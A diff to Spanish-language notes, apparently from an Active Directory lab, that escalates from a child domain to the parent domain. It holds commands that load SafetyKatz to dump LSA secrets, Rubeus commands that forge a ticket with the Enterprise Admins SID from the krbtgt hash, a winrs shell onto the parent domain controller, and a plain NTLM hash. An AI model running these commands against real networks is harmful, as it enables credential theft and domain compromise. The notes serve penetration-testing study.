@@ -1365,8 +1365,6 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 
 Copiaremos el rc4_hmac_nt `9688c44bcc2ad7ea6f1ba555b0f4981f`
 
-
-
 Obteniendo las credenciales del dominio, podemos crear un ticket con el SID de los *Enterprise Admins*
 ```shell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:9688c44bcc2ad7ea6f1ba555b0f4981f /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
@@ -1379,7 +1377,10 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/m
 
 Una vez inyectado el ticket podemos acceder a *mcorp-dc*
 ```shell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:5f8e757822d6f6f2977af2dc94135713 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+winrs -r:mcorp-dc.moneycorp.local cmd
 ```
 
 *LO - 19*
+Escalar privilegios usando el acceso de *Domain Admin* para llegar al dominio padre *moneycorp.local* usando el hash *krbtgt* de *dollarcorp*
+
+El hash 
